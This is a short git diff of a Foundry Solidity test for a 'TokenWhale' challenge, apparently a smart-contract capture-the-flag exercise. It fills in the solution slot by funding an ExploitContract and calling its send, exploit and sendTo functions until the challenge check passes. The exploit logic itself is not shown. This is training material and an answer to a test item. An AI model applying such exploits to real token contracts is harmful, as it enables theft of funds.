@@ -17,13 +17,16 @@ contract TokenWhaleTest is Test {
         // Deploy contracts
         tokenWhale = new TokenWhale(address(this));
         exploitContract = new ExploitContract(tokenWhale);
+        tokenWhale.transfer(address(exploitContract), tokenWhale.balanceOf(address(this)));
     }
 
     // Use the instance tokenWhale and exploitContract
     // Use vm.startPrank and vm.stopPrank to change between msg.sender
     function testExploit() public {
         // Put your solution here
-
+        exploitContract.send();
+        exploitContract.exploit();
+        exploitContract.sendTo(address(this), tokenWhale.balanceOf(address(exploitContract)));
         _checkSolved();
     }
 
